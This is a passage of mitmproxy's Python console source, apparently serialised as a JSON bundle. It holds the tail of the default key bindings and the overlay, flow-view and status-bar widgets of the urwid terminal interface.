\"console.command view.flows.create get https://example.com/\",\n        [\"flowlist\"],\n        \"Create a new flow\",\n    )\n    km.add(\n        \"o\",\n        \"\"\"\n        console.choose.cmd Order view.order.options\n        set view_order {choice}\n        \"\"\",\n        [\"flowlist\"],\n        \"Set flow list order\",\n    )\n    km.add(\"r\", \"replay.client @focus\", [\"flowlist\", \"flowview\"], \"Replay this flow\")\n    km.add(\"S\", \"console.command replay.server \", [\"flowlist\"], \"Start server replay\")\n    km.add(\n        \"v\", \"set view_order_reversed toggle\", [\"flowlist\"], \"Reverse flow list order\"\n    )\n    km.add(\"U\", \"flow.mark @all false\", [\"flowlist\"], \"Un-set all marks\")\n    km.add(\n        \"w\",\n        \"console.command save.file @shown \",\n        [\"flowlist\"],\n        \"Save listed flows to file\",\n    )\n    km.add(\n        \"V\",\n        \"flow.revert @focus\",\n        [\"flowlist\", \"flowview\"],\n        \"Revert changes to this flow\",\n    )\n    km.add(\"X\", \"flow.kill @focus\", [\"flowlist\"], \"Kill this flow\")\n    km.add(\"z\", \"view.flows.remove @all\", [\"flowlist\"], \"Clear flow list\")\n    km.add(\n        \"Z\", \"view.flows.remove @hidden\", [\"flowlist\"], \"Purge all flows not showing\"\n    )\n    km.add(\n        \"|\",\n        \"console.command script.run @focus \",\n        [\"flowlist\", \"flowview\"],\n        \"Run a script on this flow\",\n    )\n\n    km.add(\n        \"e\",\n        \"\"\"\n        console.choose.cmd Part console.edit.focus.options\n        console.edit.focus {choice}\n        \"\"\",\n        [\"flowlist\", \"flowview\"],\n        \"Edit a flow component\",\n    )\n    km.add(\n        \"f\",\n        \"view.settings.setval.toggle @focus fullcontents\",\n        [\"flowview\"],\n        \"Toggle viewing full contents on this flow\",\n    )\n    km.add(\"w\", \"console.command save.file @focus \", [\"flowview\"], \"Save flow to file\")\n    km.add(\"space\", \"view.focus.next\", [\"flowview\"], \"Go to next flow\")\n\n    km.add(\n        \"v\",\n        \"\"\"\n        console.choose \"View Part\" request,response\n        console.bodyview @focus {choice}\n        \"\"\",\n        [\"flowview\"],\n        \"View flow body in an external viewer\",\n    )\n    km.add(\"p\", \"view.focus.prev\", [\"flowview\"], \"Go to previous flow\")\n    km.add(\n        \"m\",\n        \"\"\"\n        console.choose.cmd Mode console.flowview.mode.options\n        console.flowview.mode.set {choice}\n        \"\"\",\n        [\"flowview\"],\n        \"Set flow view mode\",\n    )\n    km.add(\n        \"z\",\n        \"\"\"\n        console.choose \"Part\" request,response\n        flow.encode.toggle @focus {choice}\n        \"\"\",\n        [\"flowview\"],\n        \"Encode/decode flow body\",\n    )\n\n    km.add(\"L\", \"console.command options.load \", [\"options\"], \"Load from file\")\n    km.add(\"S\", \"console.command options.save \", [\"options\"], \"Save to file\")\n    km.add(\"D\", \"options.reset\", [\"options\"], \"Reset all options\")\n    km.add(\"d\", \"console.options.reset.focus\", [\"options\"], \"Reset this option\")\n\n    km.add(\"a\", \"console.grideditor.add\", [\"grideditor\"], \"Add a row after cursor\")\n    km.add(\n        \"A\", \"console.grideditor.insert\", [\"grideditor\"], \"Insert a row before cursor\"\n    )\n    km.add(\"d\", \"console.grideditor.delete\", [\"grideditor\"], \"Delete this row\")\n    km.add(\n        \"r\",\n        \"console.command console.grideditor.load\",\n        [\"grideditor\"],\n        \"Read unescaped data into the current cell from file\",\n    )\n    km.add(\n        \"R\",\n        \"console.command console.grideditor.load_escaped\",\n        [\"grideditor\"],\n        \"Load a Python-style escaped string into the current cell from file\",\n    )\n    km.add(\"e\", \"console.grideditor.editor\", [\"grideditor\"], \"Edit in external editor\")\n    km.add(\n        \"w\",\n        \"console.command console.grideditor.save \",\n        [\"grideditor\"],\n        \"Save data to file as CSV\",\n    )\n\n    km.add(\"z\", \"eventstore.clear\", [\"eventlog\"], \"Clear\")\n\n    km.add(\n        \"a\",\n        \"\"\"\n        console.choose.cmd \"Context\" console.key.contexts\n        console.command console.key.bind {choice}\n        \"\"\",\n        [\"keybindings\"],\n        \"Add a key binding\",\n    )\n    km.add(\n        \"d\",\n        \"console.key.unbind.focus\",\n        [\"keybindings\"],\n        \"Unbind the currently focused key binding\",\n    )\n    km.add(\n        \"x\",\n        \"console.key.execute.focus\",\n        [\"keybindings\"],\n        \"Execute the currently focused key binding\",\n    )\n    km.add(\n        \"enter\",\n        \"console.key.edit.focus\",\n        [\"keybindings\"],\n        \"Edit the currently focused key binding\",\n    )\n", "mitmproxy/tools/console/overlay.py": "import math\n\nimport urwid\n\nfrom mitmproxy.tools.console import grideditor\nfrom mitmproxy.tools.console import keymap\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import signals\n\n\nclass SimpleOverlay(urwid.Overlay, layoutwidget.LayoutWidget):\n    def __init__(self, master, widget, parent, width, valign=\"middle\"):\n        self.widget = widget\n        self.master = master\n        super().__init__(\n            widget, parent, align=\"center\", width=width, valign=valign, height=\"pack\"\n        )\n\n    @property\n    def keyctx(self):\n        return getattr(self.widget, \"keyctx\")\n\n    def key_responder(self):\n        return self.widget.key_responder()\n\n    def focus_changed(self):\n        return self.widget.focus_changed()\n\n    def view_changed(self):\n        return self.widget.view_changed()\n\n    def layout_popping(self):\n        return self.widget.layout_popping()\n\n\nclass Choice(urwid.WidgetWrap):\n    def __init__(self, txt, focus, current, shortcut):\n        if shortcut:\n            selection_type = \"option_selected_key\" if focus else \"key\"\n            txt = [(selection_type, shortcut), \") \", txt]\n        else:\n            txt = \"   \" + txt\n        if current:\n            s = \"option_active_selected\" if focus else \"option_active\"\n        else:\n            s = \"option_selected\" if focus else \"text\"\n        super().__init__(\n            urwid.AttrWrap(\n                urwid.Padding(urwid.Text(txt)),\n                s,\n            )\n        )\n\n    def selectable(self):\n        return True\n\n    def keypress(self, size, key):\n        return key\n\n\nclass ChooserListWalker(urwid.ListWalker):\n    shortcuts = \"123456789abcdefghijklmnoprstuvwxyz\"\n\n    def __init__(self, choices, current):\n        self.index = 0\n        self.choices = choices\n        self.current = current\n\n    def _get(self, idx, focus):\n        c = self.choices[idx]\n        return Choice(c, focus, c == self.current, self.shortcuts[idx : idx + 1])\n\n    def set_focus(self, index):\n        self.index = index\n\n    def get_focus(self):\n        return self._get(self.index, True), self.index\n\n    def get_next(self, pos):\n        if pos >= len(self.choices) - 1:\n            return None, None\n        pos = pos + 1\n        return self._get(pos, False), pos\n\n    def get_prev(self, pos):\n        pos = pos - 1\n        if pos < 0:\n            return None, None\n        return self._get(pos, False), pos\n\n    def choice_by_shortcut(self, shortcut):\n        for i, choice in enumerate(self.choices):\n            if shortcut == self.shortcuts[i : i + 1]:\n                return choice\n        return None\n\n\nclass Chooser(urwid.WidgetWrap, layoutwidget.LayoutWidget):\n    keyctx = \"chooser\"\n\n    def __init__(self, master, title, choices, current, callback):\n        self.master = master\n        self.choices = choices\n        self.callback = callback\n        choicewidth = max(len(i) for i in choices)\n        self.width = max(choicewidth, len(title)) + 7\n\n        self.walker = ChooserListWalker(choices, current)\n        super().__init__(\n            urwid.AttrWrap(\n                urwid.LineBox(\n                    urwid.BoxAdapter(urwid.ListBox(self.walker), len(choices)),\n                    title=title,\n                ),\n                \"background\",\n            )\n        )\n\n    def selectable(self):\n        return True\n\n    def keypress(self, size, key):\n        key = self.master.keymap.handle_only(\"chooser\", key)\n        choice = self.walker.choice_by_shortcut(key)\n        if choice:\n            self.callback(choice)\n            signals.pop_view_state.send()\n            return\n        if key == \"m_select\":\n            self.callback(self.choices[self.walker.index])\n            signals.pop_view_state.send()\n            return\n        elif key in [\"q\", \"esc\"]:\n            signals.pop_view_state.send()\n            return\n\n        binding = self.master.keymap.get(\"global\", key)\n        # This is extremely awkward. We need a better way to match nav keys only.\n        if binding and binding.command.startswith(\"console.nav\"):\n            self.master.keymap.handle(\"global\", key)\n        elif key in keymap.navkeys:\n            return super().keypress(size, key)\n\n\nclass OptionsOverlay(urwid.WidgetWrap, layoutwidget.LayoutWidget):\n    keyctx = \"grideditor\"\n\n    def __init__(self, master, name, vals, vspace):\n        \"\"\"\n        vspace: how much vertical space to keep clear\n        \"\"\"\n        cols, rows = master.ui.get_cols_rows()\n        self.ge = grideditor.OptionsEditor(master, name, vals)\n        super().__init__(\n            urwid.AttrWrap(\n                urwid.LineBox(urwid.BoxAdapter(self.ge, rows - vspace), title=name),\n                \"background\",\n            )\n        )\n        self.width = math.ceil(cols * 0.8)\n\n    def key_responder(self):\n        return self.ge.key_responder()\n\n    def layout_popping(self):\n        return self.ge.layout_popping()\n\n\nclass DataViewerOverlay(urwid.WidgetWrap, layoutwidget.LayoutWidget):\n    keyctx = \"dataviewer\"\n\n    def __init__(self, master, vals):\n        \"\"\"\n        vspace: how much vertical space to keep clear\n        \"\"\"\n        cols, rows = master.ui.get_cols_rows()\n        self.ge = grideditor.DataViewer(master, vals)\n        super().__init__(\n            urwid.AttrWrap(\n                urwid.LineBox(urwid.BoxAdapter(self.ge, rows - 5), title=\"Data viewer\"),\n                \"background\",\n            )\n        )\n        self.width = math.ceil(cols * 0.8)\n\n    def key_responder(self):\n        return self.ge.key_responder()\n\n    def layout_popping(self):\n        return self.ge.layout_popping()\n", "mitmproxy/tools/console/flowview.py": "import logging\nimport math\nimport sys\nfrom functools import lru_cache\n\nimport urwid\n\nimport mitmproxy.flow\nimport mitmproxy.tools.console.master\nfrom mitmproxy import contentviews\nfrom mitmproxy import ctx\nfrom mitmproxy import dns\nfrom mitmproxy import http\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\nfrom mitmproxy.tools.console import common\nfrom mitmproxy.tools.console import flowdetailview\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import searchable\nfrom mitmproxy.tools.console import tabs\nfrom mitmproxy.utils import strutils\n\n\nclass SearchError(Exception):\n    pass\n\n\nclass FlowViewHeader(urwid.WidgetWrap):\n    def __init__(\n        self,\n        master: \"mitmproxy.tools.console.master.ConsoleMaster\",\n    ) -> None:\n        self.master = master\n        self.focus_changed()\n\n    def focus_changed(self):\n        cols, _ = self.master.ui.get_cols_rows()\n        if self.master.view.focus.flow:\n            self._w = common.format_flow(\n                self.master.view.focus.flow,\n                render_mode=common.RenderMode.DETAILVIEW,\n                hostheader=self.master.options.showhost,\n            )\n        else:\n            self._w = urwid.Pile([])\n\n\nclass FlowDetails(tabs.Tabs):\n    def __init__(self, master):\n        self.master = master\n        super().__init__([])\n        self.show()\n        self.last_displayed_body = None\n        contentviews.on_add.connect(self.contentview_changed)\n        contentviews.on_remove.connect(self.contentview_changed)\n\n    @property\n    def view(self):\n        return self.master.view\n\n    @property\n    def flow(self) -> mitmproxy.flow.Flow:\n        return self.master.view.focus.flow\n\n    def contentview_changed(self, view):\n        # this is called when a contentview addon is live-reloaded.\n        # we clear our cache and then rerender\n        self._get_content_view.cache_clear()\n        if self.master.window.current_window(\"flowview\"):\n            self.show()\n\n    def focus_changed(self):\n        f = self.flow\n        if f:\n            if isinstance(f, http.HTTPFlow):\n                if f.websocket:\n                    self.tabs = [\n                        (self.tab_http_request, self.view_request),\n                        (self.tab_http_response, self.view_response),\n                        (self.tab_websocket_messages, self.view_websocket_messages),\n                        (self.tab_details, self.view_details),\n                    ]\n                else:\n                    self.tabs = [\n                        (self.tab_http_request, self.view_request),\n                        (self.tab_http_response, self.view_response),\n                        (self.tab_details, self.view_details),\n                    ]\n            elif isinstance(f, tcp.TCPFlow):\n                self.tabs = [\n                    (self.tab_tcp_stream, self.view_message_stream),\n                    (self.tab_details, self.view_details),\n                ]\n            elif isinstance(f, udp.UDPFlow):\n                self.tabs = [\n                    (self.tab_udp_stream, self.view_message_stream),\n                    (self.tab_details, self.view_details),\n                ]\n            elif isinstance(f, dns.DNSFlow):\n                self.tabs = [\n                    (self.tab_dns_request, self.view_dns_request),\n                    (self.tab_dns_response, self.view_dns_response),\n                    (self.tab_details, self.view_details),\n                ]\n            self.show()\n        else:\n            self.master.window.pop()\n\n    def tab_http_request(self):\n        flow = self.flow\n        assert isinstance(flow, http.HTTPFlow)\n        if self.flow.intercepted and not flow.response:\n            return \"Request intercepted\"\n        else:\n            return \"Request\"\n\n    def tab_http_response(self):\n        flow = self.flow\n        assert isinstance(flow, http.HTTPFlow)\n\n        # there is no good way to detect what part of the flow is intercepted,\n        # so we apply some heuristics to see if it's the HTTP response.\n        websocket_started = flow.websocket and len(flow.websocket.messages) != 0\n        response_is_intercepted = (\n            self.flow.intercepted and flow.response and not websocket_started\n        )\n        if response_is_intercepted:\n            return \"Response intercepted\"\n        else:\n            return \"Response\"\n\n    def tab_dns_request(self) -> str:\n        flow = self.flow\n        assert isinstance(flow, dns.DNSFlow)\n        if self.flow.intercepted and not flow.response:\n            return \"Request intercepted\"\n        else:\n            return \"Request\"\n\n    def tab_dns_response(self) -> str:\n        flow = self.flow\n        assert isinstance(flow, dns.DNSFlow)\n        if self.flow.intercepted and flow.response:\n            return \"Response intercepted\"\n        else:\n            return \"Response\"\n\n    def tab_tcp_stream(self):\n        return \"TCP Stream\"\n\n    def tab_udp_stream(self):\n        return \"UDP Stream\"\n\n    def tab_websocket_messages(self):\n        flow = self.flow\n        assert isinstance(flow, http.HTTPFlow)\n        assert flow.websocket\n\n        if self.flow.intercepted and len(flow.websocket.messages) != 0:\n            return \"WebSocket Messages intercepted\"\n        else:\n            return \"WebSocket Messages\"\n\n    def tab_details(self):\n        return \"Detail\"\n\n    def view_request(self):\n        flow = self.flow\n        assert isinstance(flow, http.HTTPFlow)\n        return self.conn_text(flow.request)\n\n    def view_response(self):\n        flow = self.flow\n        assert isinstance(flow, http.HTTPFlow)\n        return self.conn_text(flow.response)\n\n    def view_dns_request(self):\n        flow = self.flow\n        assert isinstance(flow, dns.DNSFlow)\n        return self.dns_message_text(\"request\", flow.request)\n\n    def view_dns_response(self):\n        flow = self.flow\n        assert isinstance(flow, dns.DNSFlow)\n        return self.dns_message_text(\"response\", flow.response)\n\n    def _contentview_status_bar(self, description: str, viewmode: str):\n        cols = [\n            urwid.Text(\n                [\n                    (\"heading\", description),\n                ]\n            ),\n            urwid.Text(\n                [\n                    \" \",\n                    (\"heading\", \"[\"),\n                    (\"heading_key\", \"m\"),\n                    (\"heading\", (\":%s]\" % viewmode)),\n                ],\n                align=\"right\",\n            ),\n        ]\n        contentview_status_bar = urwid.AttrWrap(urwid.Columns(cols), \"heading\")\n        return contentview_status_bar\n\n    FROM_CLIENT_MARKER = (\"from_client\", f\"{common.SYMBOL_FROM_CLIENT} \")\n    TO_CLIENT_MARKER = (\"to_client\", f\"{common.SYMBOL_TO_CLIENT} \")\n\n    def view_websocket_messages(self):\n        flow = self.flow\n        assert isinstance(flow, http.HTTPFlow)\n        assert flow.websocket is not None\n\n        if not flow.websocket.messages:\n            return searchable.Searchable([urwid.Text((\"highlight\", \"No messages.\"))])\n\n        viewmode = self.master.commands.call(\"console.flowview.mode\")\n\n        widget_lines = []\n        for m in flow.websocket.messages:\n            _, lines, _ = contentviews.get_message_content_view(viewmode, m, flow)\n\n            for line in lines:\n                if m.from_client:\n                    line.insert(0, self.FROM_CLIENT_MARKER)\n                else:\n                    line.insert(0, self.TO_CLIENT_MARKER)\n\n                widget_lines.append(urwid.Text(line))\n\n        if flow.websocket.closed_by_client is not None:\n            widget_lines.append(\n                urwid.Text(\n                    [\n                        (\n                            self.FROM_CLIENT_MARKER\n                            if flow.websocket.closed_by_client\n                            else self.TO_CLIENT_MARKER\n                        ),\n                        (\n                            \"alert\"\n                            if flow.websocket.close_code in (1000, 1001, 1005)\n                            else \"error\",\n                            f\"Connection closed: {flow.websocket.close_code} {flow.websocket.close_reason}\",\n                        ),\n                    ]\n                )\n            )\n\n        if flow.intercepted:\n            markup = widget_lines[-1].get_text()[0]\n            widget_lines[-1].set_text((\"intercept\", markup))\n\n        widget_lines.insert(\n            0, self._contentview_status_bar(viewmode.capitalize(), viewmode)\n        )\n\n        return searchable.Searchable(widget_lines)\n\n    def view_message_stream(self) -> urwid.Widget:\n        flow = self.flow\n        assert isinstance(flow, (tcp.TCPFlow, udp.UDPFlow))\n\n        if not flow.messages:\n            return searchable.Searchable([urwid.Text((\"highlight\", \"No messages.\"))])\n\n        viewmode = self.master.commands.call(\"console.flowview.mode\")\n\n        widget_lines = []\n        for m in flow.messages:\n            _, lines, _ = contentviews.get_message_content_view(viewmode, m, flow)\n\n            for line in lines:\n                if m.from_client:\n                    line.insert(0, self.FROM_CLIENT_MARKER)\n                else:\n                    line.insert(0, self.TO_CLIENT_MARKER)\n\n                widget_lines.append(urwid.Text(line))\n\n        if flow.intercepted:\n            markup = widget_lines[-1].get_text()[0]\n            widget_lines[-1].set_text((\"intercept\", markup))\n\n        widget_lines.insert(\n            0, self._contentview_status_bar(viewmode.capitalize(), viewmode)\n        )\n\n        return searchable.Searchable(widget_lines)\n\n    def view_details(self):\n        return flowdetailview.flowdetails(self.view, self.flow)\n\n    def content_view(self, viewmode, message):\n        if message.raw_content is None:\n            msg, body = \"\", [urwid.Text([(\"error\", \"[content missing]\")])]\n            return msg, body\n        else:\n            full = self.master.commands.execute(\n                \"view.settings.getval @focus fullcontents false\"\n            )\n            if full == \"true\":\n                limit = sys.maxsize\n            else:\n                limit = ctx.options.content_view_lines_cutoff\n\n            flow_modify_cache_invalidation = hash(\n                (\n                    message.raw_content,\n                    message.headers.fields,\n                    getattr(message, \"path\", None),\n                )\n            )\n            # we need to pass the message off-band because it's not hashable\n            self._get_content_view_message = message\n            return self._get_content_view(\n                viewmode, limit, flow_modify_cache_invalidation\n            )\n\n    @lru_cache(maxsize=200)\n    def _get_content_view(self, viewmode, max_lines, _):\n        message = self._get_content_view_message\n        self._get_content_view_message = None\n        description, lines, error = contentviews.get_message_content_view(\n            viewmode, message, self.flow\n        )\n        if error:\n            logging.debug(error)\n        # Give hint that you have to tab for the response.\n        if description == \"No content\" and isinstance(message, http.Request):\n            description = \"No request content\"\n\n        # If the users has a wide terminal, he gets fewer lines; this should not be an issue.\n        chars_per_line = 80\n        max_chars = max_lines * chars_per_line\n        total_chars = 0\n        text_objects = []\n        for line in lines:\n            txt = []\n            for style, text in line:\n                if total_chars + len(text) > max_chars:\n                    text = text[: max_chars - total_chars]\n                txt.append((style, text))\n                total_chars += len(text)\n                if total_chars == max_chars:\n                    break\n\n            # round up to the next line.\n            total_chars = int(math.ceil(total_chars / chars_per_line) * chars_per_line)\n\n            text_objects.append(urwid.Text(txt))\n            if total_chars == max_chars:\n                text_objects.append(\n                    urwid.Text(\n                        [\n                            (\n                                \"highlight\",\n                                \"Stopped displaying data after %d lines. Press \"\n                                % max_lines,\n                            ),\n                            (\"key\", \"f\"),\n                            (\"highlight\", \" to load all data.\"),\n                        ]\n                    )\n                )\n                break\n\n        return description, text_objects\n\n    def conn_text(self, conn):\n        if conn:\n            hdrs = []\n            for k, v in conn.headers.fields:\n                # This will always force an ascii representation of headers. For example, if the server sends a\n                #\n                #     X-Authors: Made with \u2764 in Hamburg\n                #\n                # header, mitmproxy will display the following:\n                #\n                #     X-Authors: Made with \\xe2\\x9d\\xa4 in Hamburg.\n                #\n                # The alternative would be to just use the header's UTF-8 representation and maybe\n                # do `str.replace(\"\\t\", \"\\\\t\")` to exempt tabs from urwid's special characters escaping [1].\n                # That would in some terminals allow rendering UTF-8 characters, but the mapping\n                # wouldn't be bijective, i.e. a user couldn't distinguish \"\\\\t\" and \"\\t\".\n                # Also, from a security perspective, a mitmproxy user couldn't be fooled by homoglyphs.\n                #\n                # 1) https://github.com/mitmproxy/mitmproxy/issues/1833\n                #    https://github.com/urwid/urwid/blob/6608ee2c9932d264abd1171468d833b7a4082e13/urwid/display_common.py#L35-L36,\n\n                k = strutils.bytes_to_escaped_str(k) + \":\"\n                v = strutils.bytes_to_escaped_str(v)\n                hdrs.append((k, v))\n            txt = common.format_keyvals(hdrs, key_format=\"header\")\n            viewmode = self.master.commands.call(\"console.flowview.mode\")\n            msg, body = self.content_view(viewmode, conn)\n\n            cols = [\n                urwid.Text(\n                    [\n                        (\"heading\", msg),\n                    ]\n                ),\n                urwid.Text(\n                    [\n                        \" \",\n                        (\"heading\", \"[\"),\n                        (\"heading_key\", \"m\"),\n                        (\"heading\", (\":%s]\" % viewmode)),\n                    ],\n                    align=\"right\",\n                ),\n            ]\n            title = urwid.AttrWrap(urwid.Columns(cols), \"heading\")\n\n            txt.append(title)\n            txt.extend(body)\n        else:\n            txt = [\n                urwid.Text(\"\"),\n                urwid.Text(\n                    [\n                        (\"highlight\", \"No response. Press \"),\n                        (\"key\", \"e\"),\n                        (\"highlight\", \" and edit any aspect to add one.\"),\n                    ]\n                ),\n            ]\n        return searchable.Searchable(txt)\n\n    def dns_message_text(\n        self, type: str, message: dns.Message | None\n    ) -> searchable.Searchable:\n        # Keep in sync with web/src/js/components/FlowView/DnsMessages.tsx\n        if message:\n\n            def rr_text(rr: dns.ResourceRecord):\n                return urwid.Text(\n                    f\"  {rr.name} {dns.types.to_str(rr.type)} {dns.classes.to_str(rr.class_)} {rr.ttl} {str(rr)}\"\n                )\n\n            txt = []\n            txt.append(\n                urwid.Text(\n                    \"{recursive}Question\".format(\n                        recursive=\"Recursive \" if message.recursion_desired else \"\",\n                    )\n                )\n            )\n            txt.extend(\n                urwid.Text(\n                    f\"  {q.name} {dns.types.to_str(q.type)} {dns.classes.to_str(q.class_)}\"\n                )\n                for q in message.questions\n            )\n            txt.append(urwid.Text(\"\"))\n            txt.append(\n                urwid.Text(\n                    \"{authoritative}{recursive}Answer\".format(\n                        authoritative=\"Authoritative \"\n                        if message.authoritative_answer\n                        else \"\",\n                        recursive=\"Recursive \" if message.recursion_available else \"\",\n                    )\n                )\n            )\n            txt.extend(map(rr_text, message.answers))\n            txt.append(urwid.Text(\"\"))\n            txt.append(urwid.Text(\"Authority\"))\n            txt.extend(map(rr_text, message.authorities))\n            txt.append(urwid.Text(\"\"))\n            txt.append(urwid.Text(\"Addition\"))\n            txt.extend(map(rr_text, message.additionals))\n            return searchable.Searchable(txt)\n        else:\n            return searchable.Searchable([urwid.Text((\"highlight\", f\"No {type}.\"))])\n\n\nclass FlowView(urwid.Frame, layoutwidget.LayoutWidget):\n    keyctx = \"flowview\"\n    title = \"Flow Details\"\n\n    def __init__(self, master):\n        super().__init__(\n            FlowDetails(master),\n            header=FlowViewHeader(master),\n        )\n        self.master = master\n\n    def focus_changed(self, *args, **kwargs):\n        self.body.focus_changed()\n        self.header.focus_changed()\n", "mitmproxy/tools/console/statusbar.py": "from __future__ import annotations\n\nfrom collections.abc import Callable\nfrom functools import lru_cache\n\nimport urwid\n\nimport mitmproxy.tools.console.master\nfrom mitmproxy.tools.console import commandexecutor\nfrom mitmproxy.tools.console import common\nfrom mitmproxy.tools.console import flowlist\nfrom mitmproxy.tools.console import quickhelp\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.tools.console.commander import commander\nfrom mitmproxy.utils import human\n\n\n@lru_cache\ndef shorten_message(\n    msg: tuple[str, str] | str, max_width: int\n) -> list[tuple[str, str]]:\n    \"\"\"\n    Shorten message so that it fits into a single line in the statusbar.\n    \"\"\"\n    if isinstance(msg, tuple):\n        disp_attr, msg_text = msg\n    elif isinstance(msg, str):\n        msg_text = msg\n        disp_attr = \"\"\n    else:\n        raise AssertionError(f\"Unexpected message type: {type(msg)}\")\n    msg_end = \"\\u2026\"  # unicode ellipsis for the end of shortened message\n    prompt = \"(more in eventlog)\"\n\n    msg_lines = msg_text.split(\"\\n\")\n    first_line = msg_lines[0]\n    if len(msg_lines) > 1:\n        # First line of messages with a few lines must end with prompt.\n        line_length = len(first_line) + len(prompt)\n    else:\n        line_length = len(first_line)\n\n    if line_length > max_width:\n        shortening_index = max(0, max_width - len(prompt) - len(msg_end))\n        first_line = first_line[:shortening_index] + msg_end\n    else:\n        if len(msg_lines) == 1:\n            prompt = \"\"\n\n    return [(disp_attr, first_line), (\"warn\", prompt)]\n\n\nclass ActionBar(urwid.WidgetWrap):\n    def __init__(self, master: mitmproxy.tools.console.master.ConsoleMaster) -> None:\n        self.master = master\n        self.top = urwid.WidgetWrap(urwid.Text(\"\"))\n        self.bottom = urwid.WidgetWrap(urwid.Text(\"\"))\n        super().__init__(urwid.Pile([self.top, self.bottom]))\n        self.show_quickhelp()\n        signals.status_message.connect(self.sig_message)\n        signals.status_prompt.connect(self.sig_prompt)\n        signals.status_prompt_onekey.connect(self.sig_prompt_onekey)\n        signals.status_prompt_command.connect(self.sig_prompt_command)\n        signals.window_refresh.connect(self.sig_update)\n        master.view.focus.sig_change.connect(self.sig_update)\n        master.view.sig_view_update.connect(self.sig_update)\n\n        self.prompting: Callable[[str], None] | None = None\n\n        self.onekey: set[str] | None = None\n\n    def sig_update(self, flow=None) -> None:\n        if not self.prompting and flow is None or flow == self.master.view.focus.flow:\n            self.show_quickhelp()\n\n    def sig_message(\n        self, message: tuple[str, str] | str, expire: int | None = 1\n    ) -> None:\n        if self.prompting:\n            return\n        cols, _ = self.master.ui.get_cols_rows()\n        w = urwid.Text(shorten_message(message, cols))\n        self.top._w = w\n        self.bottom._w = urwid.Text(\"\")\n        if expire:\n\n            def cb():\n                if w == self.top._w:\n                    self.show_quickhelp()\n\n            signals.call_in.send(seconds=expire, callback=cb)\n\n    def sig_prompt(\n        self, prompt: str, text: str | None, callback: Callable[[str], None]\n    ) -> None:\n        signals.focus.send(section=\"footer\")\n        self.top._w = urwid.Edit(f\"{prompt.strip()}: \", text or \"\")\n        self.bottom._w = urwid.Text(\"\")\n        self.prompting = callback\n\n    def sig_prompt_command(self, partial: str = \"\", cursor: int | None = None) -> None:\n        signals.focus.send(section=\"footer\")\n        self.top._w = commander.CommandEdit(\n            self.master,\n            partial,\n        )\n        if cursor is not None:\n            self.top._w.cbuf.cursor = cursor\n        self.bottom._w = urwid.Text(\"\")\n        self.prompting = self.execute_command\n\n    def execute_command(self, txt: str) -> None:\n        if txt.strip():\n            self.master.commands.call(\"commands.history.add\", txt)\n        execute = commandexecutor.CommandExecutor(self.master)\n        execute(txt)\n\n    def sig_prompt_onekey(\n        self, prompt: str, keys: list[tuple[str, str]], callback: Callable[[str], None]\n    ) -> None:\n        \"\"\"\n        Keys are a set of (word, key) tuples. The appropriate key in the\n        word is highlighted.\n        \"\"\"\n        signals.focus.send(section=\"footer\")\n        parts = [prompt, \" (\"]\n        mkup = []\n        for i, e in enumerate(keys):\n            mkup.extend(common.highlight_key(e[0], e[1]))\n            if i < len(keys) - 1:\n                mkup.append(\",\")\n        parts.extend(mkup)\n        parts.append(\")? \")\n        self.onekey = {i[1] for i in keys}\n        self.top._w = urwid.Edit(parts, \"\")\n        self.bottom._w = urwid.Text(\"\")\n        self.prompting = callback\n\n    def selectable(self) -> bool:\n        return True\n\n    def keypress(self, size, k):\n        if self.prompting:\n            if k == \"esc\":\n                self.prompt_done()\n            elif self.onekey:\n                if k == \"enter\":\n                    self.prompt_done()\n                elif k in self.onekey:\n                    self.prompt_execute(k)\n            elif k == \"enter\":\n                text = self.top._w.get_edit_text()\n                self.prompt_execute(text)\n            else:\n                if common.is_keypress(k):\n                    self.top._w.keypress(size, k)\n                else:\n                    return k\n\n    def show_quickhelp(self) -> None:\n        if w := self.master.window:\n            s = w.focus_stack()\n            focused_widget = type(s.top_widget())\n            is_top_widget = len(s.stack) == 1\n        else:  # on startup\n            focused_widget = flowlist.FlowListBox\n            is_top_widget = True\n        focused_flow = self.master.view.focus.flow\n        qh = quickhelp.make(focused_widget, focused_flow, is_top_widget)\n        self.top._w, self.bottom._w = qh.make_rows(self.master.keymap)\n\n    def prompt_done(self) -> None:\n        self.prompting = None\n        self.onekey = None\n        self.show_quickhelp()\n        signals.focus.send(section=\"body\")\n\n    def prompt_execute(self, txt) -> None:\n        callback = self.prompting\n        assert callback is not None\n        self.prompt_done()\n        msg = callback(txt)\n        if msg:\n            signals.status_message.send(message=msg, expire=1)\n\n\nclass StatusBar(urwid.WidgetWrap):\n    REFRESHTIME = 0.5  # Timed refresh time in seconds\n    keyctx = \"\"\n\n    def __init__(self, master: mitmproxy.tools.console.master.ConsoleMaster) -> None:\n        self.master = master\n        self.ib = urwid.WidgetWrap(urwid.Text(\"\"))\n        self.ab = ActionBar(self.master)\n        super().__init__(urwid.Pile([self.ib, self.ab]))\n        signals.flow_change.connect(self.sig_update)\n        signals.update_settings.connect(self.sig_update)\n        master.options.changed.connect(self.sig_update)\n        master.view.focus.sig_change.connect(self.sig_update)\n        master.view.sig_view_add.connect(self.sig_update)\n        self.refresh()\n\n    def refresh(self) -> None:\n        self.redraw()\n        signals.call_in.send(seconds=self.REFRESHTIME, callback=self.refresh)\n\n    def sig_update(self, *args, **kwargs) -> None:\n        self.redraw()\n\n    def keypress(self, *args, **kwargs):\n        return self.ab.keypress(*args, **kwargs)\n\n    def get_status(self) -> list[tuple[str, str] | str]:\n        r: list[tuple[str, str] | str] = []\n\n        sreplay = self.master.commands.call(\"replay.server.count\")\n        creplay = self.master.commands.call(\"replay.client.count\")\n\n        if len(self.master.options.modify_headers):\n            r.append(\"[\")\n            r.append((\"heading_key\", \"H\"))\n            r.append(\"eaders]\")\n        if len(self.master.options.modify_body):\n            r.append(\"[%d body modifications]\" % len(self.master.options.modify_body))\n        if creplay:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"cplayback\"))\n            r.append(\":%s]\" % creplay)\n        if sreplay:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"splayback\"))\n            r.append(\":%s]\" % sreplay)\n        if self.master.options.ignore_hosts:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"I\"))\n            r.append(\"gnore:%d]\" % len(self.master.options.ignore_hosts))\n        elif self.master.options.allow_hosts:\n            r.append(\"[\")\n            r.append((\"heading_key\", \"A\"))\n            r.append(\"llow:%d]\" % 